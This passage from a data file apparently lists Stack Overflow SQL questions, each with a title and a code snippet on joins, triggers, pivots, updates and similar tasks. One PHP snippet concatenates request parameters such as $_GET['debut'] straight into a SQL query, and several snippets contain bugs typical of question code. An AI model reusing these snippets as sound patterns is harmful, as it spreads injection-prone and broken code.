INNER join table2 b on a.columnA = b.columnC
SET a.`columnB` = b.`columnD`
-- WHERE clause if needed ...
"
1303,3298,Continue after primary key violation error,"Create trigger T_CommReceiptInsteadOfInsert on CommReceipt
Instead of Insert
As
Begin

--Insert duplicate records into another table
Insert Into CommReceipt_Duplicates(CR_Key, ...)
Select CR_Key, ...
From inserted i
Where exists (select * from CommReceipt c Where c.CR_Key = i.CR_Key)

--Insert non duplicate records
Insert Into CommReceipt(CR_Key, ...)
Select CR_Key, ...
From inserted i
Where not exists (select * from CommReceipt c Where c.CR_Key = i.CR_Key)

End
"
4460,41785,How do I change the version of my SQL Server instance?,"ALTER DATABASE database_name SET COMPATIBILITY_LEVEL = 110
"
5232,42551,SQL database self interaction entity,"Airport1 Airport2 Distance
"
6623,36425,How to subtract one row from another row in the same table?,"select RequisitionCode ,
(
ISNULL((select top 1 ApprovedCount from RequisitionHistory rh
where rh.RequisitionCode =r.RequisitionCode order by rh.RequisitionDate desc),0)
-
ISNULL(
(select top 1 ApprovedCount from RequisitionHistory rh1 where rh1.RequisitionHistoryCode
NOT IN 
  (select top 1 RequisitionHistoryCode from RequisitionHistory rh2 
    where rh2.RequisitionCode =r.RequisitionCode order by rh2.RequisitionDate desc) 
  and rh1.RequisitionCode = r.RequisitionCode order by rh1.RequisitionDate DESC),0))
as StructureChange 
from Requisition r
"
16717,8658,select minute avg in one minute increments,"SELECT AVG(price), DATE(timecolumn), HOUR(timecolumn), MINUTE(timecolumn)
FROM `table` 
WHERE TIME(timeColumn) >= '09:00:00' AND TIME(timeColumn) <= '17:01:00'
GROUP BY DATE(timecolumn), HOUR(timecolumn), MINUTE(timecolumn)
"
28177,66803,Hiding Subreports in SQL Report (RDL),"<Subreport Name=""SubReport"">
  <ReportName>SubReport</ReportName>
  <Visibility>
    <Hidden>=Not Parameters!ShowLogo.Value</Hidden>
  </Visibility>
</Subreport>
"
19650,2640,Oracle SQL Find and Replace,"UPDATE YOUR_TABLE t
SET T.COLUMN = REPLACE(T.COLUMN, 'FD>;', 'FD>;1')
"
29519,72452,Data type conversion in SQL query,"   SELECT 
       T0.[ItmsGrpCod], 
       T1.[Dscription], 
       T3.[OnHand] as 'Opening balance',
       case when isnumeric(T1.[U_TotalGraded]) = 1 and 
                 isnumeric(T1.[U_TotalRej]) = 1 
            then cast(T1.[U_TotalGraded] as int) + cast(T1.[U_TotalRej] as int) 
            else 0 -- do something if can't be converted
       end,
       T1.[U_TotalGraded], 
       T1.[U_TotalRej], 
       T2.[DocDate] 
   FROM OITM T0  
   INNER JOIN IGN1 T1 ON T0.[ItemCode] = T1.[ItemCode] 
   INNER JOIN OIGN T2 ON T1.[DocEntry] = T2.[DocEntry] 
   INNER JOIN OITW T3 ON T0.[ItemCode] = T3.[ItemCode]
"
22843,5631,SQL Group By and Agregate a column and its correspondent value in another column,"SELECT t1.f1
,      t.f2
,      t1.f3
FROM        tbl   t1

cross apply (SELECT max(f2) f2
    FROM tbl
    GROUP BY f1) t
WHERE t1.f2=t.f2
"
11251,32975,Add two SQL fields together in new column,"UPDATE YourTable
SET NEWVAL = STOCKVOLUME + UNITS
"
34757,38332,How to query a table for different columns based on first column result,"select * 
  from my_table 
 where (column_1 = ""xxx""
   and exists (select null from my_table where column_1 = ""xxx""))
    or (column_2 = ""xxx""
   and not exists (select null from my_table where column_1 = ""xxx""))
"
17535,61627,bitwise exclusive OR in Oracle,"function bitor(p1 number, p2 number) return number is
begin
  return p1-bitand(p1,p2)+p2;
end;

function bitxor(p1 number, p2 number) return number is
begin
  return bitor(p1,p2)-bitand(p1,p2);
end;
"
9357,24091,Node-based SQL builder with Common Table Expression (WITH clause) support,"function knexExample (io, knex) {
  io.on('connection', function (socket) {
    var this_cte = knex('this_table').select('this_column');

    var that_cte = knex('that_table').select('that_column');

    knex.raw('with t1 as (' + this_cte + 
    '), t2 as (' + that_cte + ')' + 
    knex.select(['this', 'that'])
      .from(['t1', 't2'])
    )
    .then(function (rows) {
      socket.emit('this_that:update', rows);
    });
  })
}

module.exports = knexExample;
"
13873,43884,How to get an id for the dates,"select id, dates
from Table1
where dates < dateadd(month, -6, getdate())
"
6132,27202,T-SQL Compare a group of rows with other groups of rows,"select t2.symbol, t1.symbol
from (select t1.*, count(*) over (partition by symbol) as cnt
      from table1 t1
     ) t1 join
     table2 t2
     on t1.value = t2.value
group by t1.symbol, t2.symbol, t1.cnt;
having count(*) = t1.cnt
"
1059,43998,How do I enforce uniqueness in a table?,"ALTER TABLE yourtable ADD CONSTRAINT constraintname UNIQUE (student_id, subject, academic_period)
"
10416,31444,populate null columns in database,"UPDATE table_name 
SET new_value = (original_value * amount) 
WHERE new_value IS NULL
"
31415,28385,Update HttpResponse Every Few Seconds,"def myview(request, params):
    return HttpResponse(mygenerator(params))


def mygenerator(params):
    for i,e in enumerate(params):
        yield '<li>%s</li>' % Table.objects.filter(someObjectForFilter[i])
"
9067,73675,Conditional SUM not returning any value,"SELECT 
  device_type
  , model
  , COUNT(CASE WHEN user_tag NOT LIKE '%decommissioned%' THEN 1 ELSE NULL END) as 'Assigned'
  , COUNT(CASE WHEN user_tag LIKE '%decommissioned%' THEN 1 ELSE NULL END) as 'Avail'
  , COUNT(*) as 'TotalItems'
FROM devices
WHERE auto_tag LIKE '%LA2%' OR user_tag LIKE '%LA2%' OR location LIKE '%LA2%'
GROUP BY model, device_type
ORDER BY location DESC, device_type ASC​
"
29016,30034,SQL Server Sum multiple rows into one - no temp table,"UPDATE MyTable SET VALUE = (SELECT SUM(Value) FROM MyTable MT WHERE MT.Person = MyTable.Person);

WITH DUP_TABLE AS
   (SELECT ROW_NUMBER()
    OVER (PARTITION BY Person ORDER BY Person) As ROW_NO
    FROM MyTable)
DELETE FROM DUP_TABLE WHERE ROW_NO > 1;
"
12589,28488,Is it possible to run an Oracle script from Groovy?,"def proc = ""sqlplus $username/$password@$db $scriptFilename"".execute()
proc.consumeProcessOutput( System.out, System.err )
proc.waitFor()
"
36983,11065,T-SQL - Keep inserted rows in Temp table - after a rollback,"DECLARE @test TABLE (Test INT)
BEGIN TRAN
    INSERT INTO @test SELECT 1
ROLLBACK
SELECT * FROM @test
"
27950,524,add zero to the count where ever there no data for field,"SELECT 
   TAB1.ID,
   TAB1.NAME,TAB2.DESIGN,
   SUM(CASE WHEN TAB1.ID=TAB2.ID THEN 1 ELSE 0 END) as count
FROM 
   TAB1 CROSS JOIN TAB2
GROUP BY 
   TAB1.ID,TAB1.NAME,TAB2.DESIGN
ORDER BY 
   TAB1.ID
"
17924,4221,How to import just the data without indexes and constraints in Oracle using 'imp' command,"%> imp help=y
"
5654,55061,Mysql: How to call sql script file from other sql script file?,"use your_db;
source script/s1.sql;
source script/s2.sql;
-- so on, so forth
"
34686,69740,Reset or Update Row Position Integer in Database Table,"with cte as (
 select OrderId, row_number() over (order by Name) as rn
 from Table)
update cte
 set OrderId = rn;
"
28873,69052,Remove decimal points from numbers to use in a JOIN,"select a.cola, b.colb 
from tablea a inner join tableb b 
on replace(b.commonfield,'.','')=replace(a.commonfield,'.','')
"
38049,69184,Group rows by timestamp and conditionally sum different columns,"SELECT SUM(count) AS total
    , SUM(CASE 
              WHEN Source = 'outside' 
                   AND Destination = 'inside' 
                   THEN count  -- Use 1 if you only want to count each row
              ELSE 0 END) AS [Inbound]
    , SUM(CASE
              WHEN Source = 'inside' 
                  AND Destination = 'outside' 
                  THEN count
              ELSE 0 END) AS [Outbound]
    , SUM(CASE 
              WHEN Source = 'inside'
                  AND Destination = 'inside' 
                  THEN count
              ELSE 0 END) AS [Internal]
FROM table 
GROUP BY round(timestamp/60)
"
2072,33344,Oracle SQL - Comparing Multiple Rows with Dates,"select t.PruchaseId, t.CustId, t.Location, t.Date
from (select t.*,
             lag(location) over (partition by CustId order by Date) as prevloc,
             lead(location) over (partition by CustId order by Date) as nextloc,
             lag(date) over (partition by CustId order by Date) as prevdate,
             lead(date) over (partition by CustId order by Date) as nextdate
      from t
     ) t
where ((prevloc <> location) and (add_months(prevdate, 2*12) > date)) or
      ((nextloc <> location) and (add_months(date, 2*12) > nextdate));
"
10180,59342,SQL WHERE insert,"SELECT Recording_artist.artist_name,Musical_genre.musical_genre,
    COUNT(Musical_genre.musical_genre) AS Songs
FROM Recording_artist
    FULL OUTER JOIN Album
        ON Recording_artist.recording_artist_id = Album.recording_artist_id
    RIGHT OUTER JOIN Song
        ON Album.album_id = Song.album_id
    INNER JOIN Musical_genre
        ON Album.musical_genre_id = Musical_genre.musical_genre_id
WHERE Musical_genre.musical_genre = 'Rock'
GROUP BY Recording_artist.artist_name,Musical_genre.musical_genre;
"
10523,52519,Selecting only one row based on a match,"select uo.user_id, uo.org_id, o.name 
from (select user_id, min(org_id) org_id
      from users_orgs where user_id in (112,113)
      group by user_id) uo
     left join orgs o on uo.org_id = o.id;
"
12448,14939,Show the declared variable value while executing stored procedure,"BEGIN
    DECLARE @curent nvarchar(100),
            @date1 datetime

    SELECT @curent=getdate()
    SELECT @date1=getdate()

    SELECT @curent
    SELECT @date1
END
"
5085,22526,Select rows from SQL table where ALL of a set of parameters exist in joined table,"SELECT B.TableA_Id
FROM #Statuses S
LEFT JOIN #TableB B
    ON B.Status_Id = S.Id
GROUP BY B.TableA_Id
HAVING COUNT(DISTINCT S.Id) = COUNT(DISTINCT B.Status_Id)
"
34319,65187,How can I get join not duplicate?,"Select p.pNo
,Coalesce(l.cDate,t.lDate,'2012-10-22') as ldate
,Coalesce(l.lStart,t.cIn) as lstart
,Coalesce(l.lStop,t.cOut  ) as lstop
from peopleall p
left join leave l on l.lNo=p.Pno and l.ldate='2012-10-22'
left join fTime t on t.tNo=p.Pno and t.cDate='2012-10-22'
"
18553,13845,dynamic globals in codeigniter,"class MY_Controller extends CI_Controller{
    function __construct(){
        parent::__construct();

        $l = $this->session->userdata(""loggedin"");
        if((!isset($l))||($l==FALSE)){
            /*user is logged out - set appropriate globals*/
        }
        else{
            /*user is logged in - fetch them from the database and set appropriate globals*/
        }
    }
}
"
26124,63102,rewriting query to avoid not in and boost performance,"SELECT picture.id, picture.caption, picture.lowresimageurl, picture.medresimageurl
                    FROM instagram_shop_picture picture 
                    INNER JOIN instagram_shop shop ON shop.id = picture.shop_id
                    left join instagram_picture_style style on style.picture_id = picture.id
                    WHERE picture.deletedAt IS NULL 
                        AND picture.isLocked = 0
                        AND picture.isShown = 1
                        AND picture.isTestimonial = 0
                        AND shop.deletedAt IS NULL
                        AND shop.isLocked = 0
                        AND shop.expirydate IS NOT NULL 
                        AND shop.expirydate > now()
                        and style.picture_id is null 
"
1196,48677,Order By in Ascending Order,"select CAST(VEN_INVOICE_REFNO AS INTEGER) as display_value, VEN_INVOICE_REFNO as return_value 
 from VENDORINVOICE
 order by 1 asc;
"
28423,44110,Trouble Excluding Nodes from Graph,"MATCH p=(:Collective:Company)<-[tree*0..4]-(downline:Collective)
WHERE
  ALL(x in relationships(p) WHERE x.activeFrom <= '2015-08-31 23:59:59'
  AND (x.activeTo IS NULL OR x.activeTo > '2015-08-31 23:59:59'))
  AND ALL(x in nodes(p) WHERE x.activeFrom <= '2015-08-31 23:59:59'
  AND (x.activeTo IS NULL OR x.activeTo > '2015-08-31 23:59:59'))
RETURN p
"
11453,36183,Assign value to array from plsql block,"declare
  type t_processed is table of number(1) index by varchar2(100);
  v_product_no varchar2(100); --hold the current value
  v_products t_processed;     --hold all processed values as keys
begin
  v_product_no := :detail_block.product_no;
  v_products(v_product_no) := 1; --create entry (v_product_no, 1)
  ...
  --later in while
  v_product_no := :detail_block.product_no;
  if(v_products.exists(v_product_no)) then --entry exists
  -- other conditions
  else
      v_products(v_product_no) := 1; --create entry (v_product_no, 1)
  end if;
...
"
9895,20683,Inner join function duplicates content,"   $sql_principale_news = ""SELECT sys_pre_values.LKey,bx_blogs_posts.PostUri,bx_blogs_posts.PostCaption,bx_blogs_posts.PostText,bx_blogs_posts.PostText,bx_blogs_posts.Categories,
  bx_blogs_posts.PostDate,bx_blogs_posts.Views,bx_blogs_posts.CommentsCount,bx_blogs_posts.allowView,Profiles.Avatar,Profiles.ID,Profiles.FirstName,Profiles.LastName,Profiles.ProfileType
  FROM bx_blogs_posts
  INNER JOIN Profiles ON bx_blogs_posts.OwnerID=Profiles.ID AND Profiles.Status='Active'
   INNER JOIN sys_pre_values ON bx_blogs_posts.NewsType=sys_pre_values.Value AND sys_pre_values.Value!=sys_pre_values.LKey// END DELETED CODE //
  WHERE bx_blogs_posts.OpenNews=1 
    AND bx_blogs_posts.PostStatus='approval'
    AND bx_blogs_posts.Categories IN ('"".$innov24_config.""')
    AND (bx_blogs_posts.allowView=3 
      OR bx_blogs_posts.allowView=4 
      OR (bx_blogs_posts.allowView=5 AND bx_blogs_posts.OwnerID IN ('"".$bigfriendlist.""')) 
      OR bx_blogs_posts.allowView IN ('"".$privacy_OthersToMe.""') 
      OR bx_blogs_posts.allowView IN ('"".$privacy_MeToOthers.""'))
 GROUP BY sys_pre_values.LKey
  ORDER BY bx_blogs_posts.PostDate DESC LIMIT "".$_GET['debut']."","".$nb_affichage_par_page."""";
"
30054,36088,How important is the order of columns in indexes?,"Cols
  1   2   3
-------------
|   | 1 |   |
| A |---|   |
|   | 2 |   |
|---|---|   |
|   |   |   |
|   | 1 | 9 |
| B |   |   |
|   |---|   |
|   | 2 |   |
|   |---|   |
|   | 3 |   |
|---|---|   |
"
6496,69536,Sql Insert Into table if Colid + multiple other collumns are all unique," create procedure doInsert
         @camppaignActionID int,
         @ipaddress varchar(50),
         @userid varchar(50),
         @emailaddress varchar(50),
         @CampaignID int,
         @userAddress varchar(50)
    as

    if ( not exists (select 1 from CampaignActionSubmissions where camppaignActionID  = @camppaignActionID  and ipaddress = @ipAddress ) 
        and 
        not exists (select 1 from CampaignActionSubmissions where camppaignActionID  = @camppaignActionID  and userid= @userid) 
        and 
        not exists (select 1 from CampaignActionSubmissions where camppaignActionID  = @camppaignActionID  and emailaddress = @emailaddress )  ) 
    begin
         insert into CampaignActionSubmissions (  EmailAddress, CampaignID, CampaignActionID, IPaddress, Timestamp, UserAddress )
  values ( @emailaddress, @campaignID, @campaignActionId, @ipaddress, getdate(), @userAddress)
    end
"
1637,49011,Wordpress SQL statement help needed?,"SELECT
  p.*
FROM wp_posts p
JOIN wp_term_relationships wtr ON p.id = wtr.object_id
JOIN wp_term_taxonomy wtt ON wtr.term_taxonomy_id = wtt.term_taxonomy_id
JOIN wp_terms wt ON wtt.term_id = wtt.term_id
WHERE wtt.name = 'Some Term'
"
37874,17966,Correct way to create a table that references variables from another table,"CREATE TABLE usr(
    uid SERIAL PRIMARY KEY ,
    uname TEXT NOT NULL
);
CREATE TABLE recipes(
    rid SERIAL PRIMARY KEY,
    content TEXT NOT NULL
);
CREATE TABLE rating(
    rid INTEGER REFERENCES recipes,
    uid INTEGER REFERENCES usr,
    rating INTEGER NOT NULL CHECK (rating between 0 and 5),
    PRIMARY KEY(rid,uid)
);
"
20431,54648,Many to many query with 3 tables,"SELECT * 
FROM 
(SELECT * FROM WAS W LEFT JOIN WAS_USER WU ON W.id=WU.wasID) TMP LEFT JOIN USER U ON TMP.userId=U.userId
"
8366,28448,SQL: aggregate function and group by,"SELECT 
 * 
FROM 
 scott.emp
WHERE 
 (deptno,job,sal) IN
 (SELECT 
   deptno,
   job,
   max(sal) 
  FROM 
   scott.emp
  WHERE 
   deptno = 20 
   and job = 'CLERK'
  GROUP BY 
   deptno,
   job
  )
"
3855,54371,How to delete the last record,"DECLARE @myTable TABLE(ID VARCHAR(3), [Date] DATETIME, Value INT)
INSERT INTO @myTable VALUES('001', CONVERT(DATETIME, '23-02-2009', 103), 300)
INSERT INTO @myTable VALUES('001', CONVERT(DATETIME, '24-02-2009', 103), 400)
INSERT INTO @myTable VALUES('001', CONVERT(DATETIME, '25-02-2009', 103), 150)
INSERT INTO @myTable VALUES('002', CONVERT(DATETIME, '23-02-2009', 103), 300)
INSERT INTO @myTable VALUES('002', CONVERT(DATETIME, '24-02-2009', 103), 400)
INSERT INTO @myTable VALUES('003', CONVERT(DATETIME, '23-02-2009', 103), 150)

DELETE @myTable
FROM @myTable M
JOIN (SELECT ID, MAX([Date]) as [Date] FROM @myTable GROUP BY [ID]) G
    ON G.ID = M.ID AND G.[Date] = M.[Date]

SELECT * FROM @myTable
"
24825,42891,Relational Algebra and SQL Oracle,"select t1.*
from table1 t1
inner join table2 t2
  on t1.name = t2.name
"
1315,37365,How to extract TLD of a domain name using regex in pl/sql?,"WITH x (y)
     AS (SELECT 'www.comp1.gov/index.php' FROM DUAL UNION ALL
         SELECT 'www.great-nice.comp.edu/#contact' FROM DUAL UNION ALL
         SELECT 'www.comp1.edu' FROM DUAL
        )
SELECT y,
       RTRIM (REGEXP_SUBSTR (y, '\.[a-z]+(/|$)'), '/') tld,
       REGEXP_SUBSTR (y, '\.([a-z]+)(/|$)', 1, 1, NULL, 1) tld2 --works only in 11gR2 and higher versions 
  FROM x;

|    y                              | tld | tld2 |
|-----------------------------------|-----|------|
|  www.comp1.gov/index.php          |.gov | gov  |
|  www.great-nice.comp.edu/#contact |.edu | edu  |
|  www.comp1.edu                    |.edu | edu  |
"
27726,1412,Querying Mutliple tables,"SELECT e.Id, e.Name, e.Date, ed.act, ed.rol, ed.comp, ed.rescd
FROM Emp AS e 
INNER JOIN EmpDetails AS ed 
ON e.Id LIKE CONCAT(%, ed.rescd)
WHERE e.Date >= trunc(sysdate)-10
"
29850,8852,3 table sql join,"SELECT [column names]
FROM 
    tableA AS a 
    LEFT JOIN tableB AS b ON b.blah = a.blah
    JOIN tableC as c ON c.foo = a.foo
"
19840,19332,How to clone or freeze an Android database cursor,"Cursor c = ...;// contains many rows
if(c.moveToFirst()){
    String[] columns = c.getColumnNames();
    while(!c.isAfterLast()){ 
        MatrixCursor newCursor = new MatrixCursor(columns , 1);
        MatrixCursor.RowBuilder b = newCursor.newRow();
        for(String col: columns){
             // in case all columns are of string type. But if they are 
             // different then see my comment below 
             b.add(c.getString(c.getColumnIndex(col)));
        }
     // invoke your listener here with newCursor
    }
}
"
21973,9545,Display vertica records vertically in vsql,"dbadmin=> select 1,2;
 ?column? | ?column?
----------+----------
        1 |        2
(1 row)

dbadmin=> \x
Expanded display is on.
dbadmin=> select 1,2;
-[ RECORD 1 ]
?column? | 1
?column? | 2

dbadmin=> select 1,2;
 ?column? | ?column?
----------+----------
        1 |        2
(1 row)

dbadmin=> \x
Expanded display is on.
dbadmin=> select 1,2;
-[ RECORD 1 ]
?column? | 1
?column? | 2
"
37966,33807,How to select row based on existance of value in other column,"select i_id, option, p_id
from (
  select
    i_id,
    option,
    p_id,
    row_number() over (partition by i_id order by case option when 'C' then 0 when 'B' then 1 when 'A' then 2 end) takeme
  from thetable
  where option in ('A', 'B', 'C')
) foo
where takeme = 1
"
962,30651,Delete rows per user and eventType keeping N rows,"DELETE API_eventLog
WHERE id IN
  (SELECT 
    id
   FROM API_eventLog AS a1
   WHERE
     (SELECT COUNT(1)
       FROM API_eventLog AS a2
       WHERE a2.userguid = a1.userguid
       AND a2.eventTypeID = a1.eventTypeID
       AND (a2.date > a1.date)) > 0); 
SELECT * FROM API_eventLog;
"
16380,75009,Assign Values of a column in SubQuery in SQL,"SELECT 
  Producer = p.PRODUCER_NAME, 
  Products = STUFF((
    SELECT ',' + pr.PRODUCT_NAME 
      FROM dbo.PRODUCT AS pr
      WHERE pr.PRODUCER_ID = p.PRODUCER_ID 
      FOR XML PATH('')).value('.[1]','nvarchar(max)'),1,1,'')
FROM dbo.PRODUCER AS p;
"
22739,2200,sql server query problem,"where
 ( 
            (isbasic = 1 and basicregdate is not null and isfull=0  ) 
            and C.BASIC_REG_DATE BETWEEN @FROM_DATE AND @TO_DATE 
      )
or 
 ( 
            ( isbasic=0 and fullregdate=null and isfull=1 and fullregdate is not null) 
            and C.FULL_REG_DATE BETWEEN @FROM_DATE AND @TO_DATE 
      )
or
(
       (isbasic=1 and basregdate is not null and fullregdate=1)
       and C.BASIC_REG_DATE BETWEEN @FROM_DATE AND @TO_DATE
) 
"
30065,73376,sql query - IF EXIST in WHERE clause,"SELECT a.*, COALESCE(t1.translation, t2.translation, t3.translation) as translation
FROM aTable a
LEFT JOIN aTableTranslate t1 ON aTable.id = t1.aTable_id AND t1.language like 'en'
LEFT JOIN aTableTranslate t2 ON aTable.id = t2.aTable_id AND t2.language like 'jp'
LEFT JOIN aTableTranslate t3 ON aTable.id = t3.aTable_id AND t3.language like 'cn'
"
14297,15234,Converting a query from Oracle PL/SQL to Microsoft T-SQL,"SELECT f.type_id, 
       LTRIM(RTRIM(f.event_type_name)), 
       LTRIM(RTRIM(e.event_name)), 
       ISNULL(LTRIM(RTRIM(e.event_title)), ' '), 
       e.cur_event_state, 
       CONVERT(VARCHAR(8), d.ev_start_dt, 112), 
       CONVERT(VARCHAR(5), d.ev_start_dt, 114), 
       CONVERT(VARCHAR(8), d.ev_end_dt, 112), 
       CONVERT(VARCHAR(5), d.ev_end_dt, 114), 
       DATENAME(DAY, d.ev_start_dt) 
FROM   rooms c 
       INNER JOIN sp_reservations d 
         ON c.room_id = d.room_id 
       INNER JOIN [EVENTS] e 
         ON d.event_id = e.event_id 
       INNER JOIN event_types f 
         ON e.event_type_id = f.[type_id] 
WHERE  @Room = RTRIM(LTRIM(REPLACE(c.room_short, '-', '*'))) 
       AND f.[type_id] IN ( '22', '40', '70', '71', 
                            '72', '105', '121', '119' ) 
       AND ( d.ev_start_dt BETWEEN CONVERT(DATETIME, [WS-TERM-START-DATE], 112) 
                                   AND 
                                         CONVERT(DATETIME, [WS-TERM-END-DATE], 
                                         112) 
              OR d.ev_end_dt BETWEEN CONVERT(DATETIME, [WS-TERM-START-DATE], 112 
                                     ) AND 
                                         CONVERT(DATETIME, [WS-TERM-END-DATE], 
                                         112) ) 
       AND NOT e.cur_event_state = '59' 
"
38542,20108,Set column type with a select ... into statement,"SELECT DISTINCTROW 
    AR_Server_Pre.OrderID, 
    CCur(AR_Server_Pre.LineTotal) AS LineTotal, 
...
"
15167,42286,Migrate records to another table,"insert into second_table(second_id, second_name, audit_cre_at, audit_cre_from)
    SELECT first_id, first_name, audit_cre_at, audit_cre_from
    FROM FIRST_TABLE f
    WHERE f.FIRST_VALID = 1;
"
8886,57337,Convert XML to .plist,"plutil -convert xml1 il_tuo_file_binario.plist
"
32186,58064,"Teradata SQL: Max (greatest), 2nd and 3rd greatest column names","select id,
       max(case when seqnum = 1 then feature end) as greatest_feature,
       max(case when seqnum = 2 then feature end) as greatest_feature2,
       max(case when seqnum = 3 then feature end) as greatest_feature3,
       max(case when seqnum = 1 then which end) as which_1,
       max(case when seqnum = 2 then which end) as which_2,
       max(case when seqnum = 3 then which end) as which_3
from (select id, feature, row_number() over (partition by id order by feature desc) as serqnum
      from ((select id, feature1 as feature, 'feature1' as which from table) union all
            (select id, feature2 as feature, 'feature2' as which from table) union all
            (select id, feature3 as feature, 'feature3' as which from table) union all
            (select id, feature4 as feature, 'feature4' as which from table) union all
            (select id, feature5 as feature, 'feature5' as which from table) union all
            (select id, feature6 as feature, 'feature6' as which from table)
           ) t
      ) t
group by id;
"
424,59692,Conditional summing (Alasql),"SUM(CASE WHEN YEAR = ""2013"" THEN REVENUE::NUMBER ELSE 0 END) AS revenue2013,  
SUM(CASE WHEN YEAR = ""2014"" THEN REVENUE::NUMBER ELSE 0 END) AS revenue2014 
"
9965,74391,SQL query to check if a select operation returns rows,"select count(*) from error_repository_BKP partition(part_maxval);
"
36865,30888,Update SQL Server  cell data with the data of next record,"declare @contact as table (firstName varchar(255), lastName varchar(255), emailID varchar(255))
insert into @contact (firstName, lastName, emailID)
values
    ('abc', 'xyz', 'something')
    ,('def', '321', 'abc.xyz@something.com')
    ,('ghi', '123', 'def.321@something.com');


with contactCTE(rowNo, firstName, lastName, emailID) 
as
(
    select 
        ROW_NUMBER() OVER (ORDER BY firstName, lastName DESC)
        ,firstName 
        ,lastName 
        ,emailID 
    from
        @contact 
)
update c1   
set
    emailID = c2.emailID 
from 
    contactCTE c1
    inner join contactCTE c2 on c1.rowNo +1 = c2.rowNo;

select * from  @contact     
"
1425,63146,is it possible select the hit field of the search query,"select CASE 
         WHEN from_a like 'FRA%' THEN from_a 
         WHEN from_alt like 'FRA%' THEN from_alt
       END as from_airport  
from details 
where from_a like 'FRA%' or from_alt like 'FRA%';
"
16648,12760,same trigger for different events,"trigger_time: { BEFORE | AFTER }
trigger_event: { INSERT | UPDATE | DELETE }
"
2823,16473,Create a report of user's privileges,"select idUser
     , max(case when idModule=1 then 1 else 0 end) as Module1
     , max(case when idModule=2 then 1 else 0 end) as Module2
     , max(case when idModule=3 then 1 else 0 end) as Module3
     , max(case when idModule=4 then 1 else 0 end) as Module4
from   your_table
group by 1
"
28210,44167,How to make two column unique in mysql with value 0/1 in one table?,"email           is_deleted  null_ident
abc@gmail.com   1           0cc175b9c0f1b6a831c399e269772661
abc@gmail.com   1           92eb5ffee6ae2fec3ad71c777531578f
abc@gmail.com   1           4a8a08f09d37b73795649038408b5f33
abc@gmail.com   0           0
"
33029,51690,store unique visitors in distributed database,"CREATE TABLE uniqueVisitor (
  dt text,
  users set<text>,
  PRIMARY KEY (dt)
);
"
8197,9396,"select all columns, simultaneously doing a ifnull on one","SELECT * FROM my_table WHERE (nullable_col1 AND nullable_col2 AND nullable_col2) IS NOT NULL
"
4418,51399,ORA-00900: invalid SQL statement- when run a procedure in oracle 10g,"begin
  exam;
end;
"
37171,19277,"SQL - Changing "" or ' in SQL so adding text is easier","insert into Table (txt) values ('It\'s an ""example"" with a backslash(\\).')
"
13045,8792,Sql server 2008 - how to get records by the earliest dates,";With Cte As
(
    Select  *, Row_Number() Over (Partition By CustID Order By Dates Asc) As Row_Number
    From    rpt
)
Select  custID, dates, stores
From    Cte
Where   Row_Number = 1
"
5066,17188,Get domain from URL in Oracle SQL,"REGEXP_REPLACE(website_url, '(http[s]?://)?(www\.)?(.*?)((/|:)(.)*|$)', '\3')
"
3596,43061,Insert trigger ends up inserting duplicate rows in partitioned table,"CREATE OR REPLACE FUNCTION add_foo(
    _d_id   INTEGER
,   _label  VARCHAR(4)
) RETURNS BIGINT AS $$
DECLARE
    _rec    foo%ROWTYPE;
BEGIN
    _rec.id := nextval('foo_id_seq');
    _rec.d_id := _d_id;
    _rec.label := _label;
    EXECUTE 'INSERT INTO foo_' || ( _d_id % 2 ) || ' SELECT $1.*' USING _rec;
    RETURN _rec.id;
END $$ LANGUAGE plpgsql;
"
34436,13578,MySQL Wrong id returns for Polymorphic Association Joins,"SELECT product.id, res.name, res.fruit_id, res.vegetable_id,
  res.is_green,res.color,product.price,res.seasonal
FROM product
JOIN
  (
  SELECT fruit.id AS fruit_id,
    0 AS vegetable_id,fruit.name,fruit.color,fruit.seasonal,
    false as is_green
  FROM fruit      
  UNION
  SELECT 0 as fruit_id,vegetable.id AS vegetable_id,
    vegetable.name,'' as `color`,false as `seasonal`, vegetable.is_green
  FROMvegetable      
) res ON (product.type_id = res.fruit_id  AND product.product_type = 'fruit')
      OR (product.type_id = res.vegetable_id AND product.product_type = 'vegetable')
"
24870,53044,Derby Trigger on UPDATE: how to update a timestamp?,"CREATE TRIGGER updateTimestamp
AFTER UPDATE OF col1, col2, col3... ON votes
REFERENCING OLD AS EXISTING
FOR EACH ROW MODE DB2SQL
    UPDATE votes SET lastvoted = CURRENT_TIMESTAMP
    WHERE pkcolumn = EXISTING.pkcolumn
"
38075,31892,use variable in FROM statement,"declare @numrows int = (select count(*) from sys.servers)
declare @i int = 1
declare @Sql(1000)
declare @servername varchar(max)

while @i <= @numrows
BEGIN
select @servername = servernaam 
from #servers where rij = @i

set @Sql = 'select * from '+@servername+'.DATABASE.DBO.TABLE'
exec(@Sql)

set @i = @i+1

END
"
21772,35235,Multi Column Pivot SQL Server,"SELECT ID,
       MAX(CASE WHEN type = 'ABC' THEN 'ABC' END) Type1,
       MAX(CASE WHEN type = 'ABC' THEN Date END) Date1,
       MAX(CASE WHEN type = 'XYG' THEN 'XYZ' END) Type2,
       MAX(CASE WHEN type = 'XYG' THEN Date END) Date2,
       MAX(Location) Location,
       MAX(Result) Result,
       MAX(CASE WHEN type = 'ABC' THEN [Proc] END) Proc1,
       MAX(CASE WHEN type = 'ABC' THEN ProcDate END) ProcDate1,
       MAX(CASE WHEN type = 'ABC' THEN ProcDetail END) ProcDetail1,
       MAX(CASE WHEN type = 'ABC' THEN ProcNotes END) ProcNotes1,
       MAX(CASE WHEN type = 'XYG' THEN [Proc] END) Proc2,
       MAX(CASE WHEN type = 'XYG' THEN ProcDate END) ProcDate2,
       MAX(CASE WHEN type = 'XYG' THEN ProcDetail END) ProcDetail2,
       MAX(CASE WHEN type = 'XYG' THEN ProcNotes END) ProcNotes2
  FROM
(
  SELECT * FROM table1 -- that's to emulate your current query with multiple joins
) q
 GROUP BY ID
"
9454,65118,Best way of getting the row just added. Heroku + Node + Postgres,"client.query('insert into your_table (...) values (...) returning *', function(err, result) {
    // ...
});
"
25729,49908,Add additional content to existing SQL string on occurrence of comma,"ALTER FUNCTION AR_BI_SplitBranchesString
(    
      @Input NVARCHAR(MAX),
      @Character CHAR(1)
)
RETURNS NVARCHAR(MAX)
AS
BEGIN
    IF @Input IS NULL RETURN NULL

    DECLARE @StartIndex INT = 1, @result NVARCHAR(MAX) = ''
    DECLARE @EndIndex INT = CHARINDEX(@Character, @Input, @StartIndex)

    WHILE @EndIndex > 0
    BEGIN
        IF @result <> ''
            SET @result += ', '

        SET @result += '[Branch].[Branch Number].&[' + 
            SUBSTRING(@Input, @StartIndex, @EndIndex - @StartIndex) + ']'

        SET @StartIndex = @EndIndex + 1
